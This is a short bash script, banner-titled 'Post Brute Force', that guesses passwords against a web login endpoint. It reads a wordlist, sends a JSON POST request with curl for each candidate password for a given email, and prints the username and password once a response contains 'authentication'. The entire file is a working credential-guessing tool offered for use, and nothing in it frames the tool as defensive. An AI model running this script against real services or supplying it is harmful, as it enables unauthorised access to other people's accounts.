#!/bin/bash

if [ "$3" = "" ]; then
	echo "How to use"
	echo "./postCurl.sh [USERNAME] [HOST] [WORDLIST]"
else
	echo "  _____          _     ____             _         ______                  "
	echo " |  __ \        | |   |  _ \           | |       |  ____|                 "
	echo " | |__) |__  ___| |_  | |_) |_ __ _   _| |_ ___  | |__ ___  _ __ ___ ___  "
	echo " |  ___/ _ \/ __| __| |  _ <| '__| | | | __/ _ \ |  __/ _ \| '__/ __/ _ \ "
	echo " | |  | (_) \__ \ |_  | |_) | |  | |_| | ||  __/ | | | (_) | | | (_|  __/ "
	echo " |_|   \___/|___/\__| |____/|_|   \__,_|\__\___| |_|  \___/|_|  \___\___| "

	count=1
	total=$(wc -l $3)
	for pass in $(cat $3); do
		echo -ne "Total $total now $count\033[0K\r"
		chamada=$(curl -s --header "Content-Type: application/json" --request POST --data '{"email":"'$1'", "password":"'$pass'"}' $2)
		if grep "authentication" <<< "$chamada" ; then
			echo "[+] username: "$1 " , password: "$pass
			break
		fi
		count=$((count + 1))
		#sleep 1
	done
	echo "[-] Exit"
fi
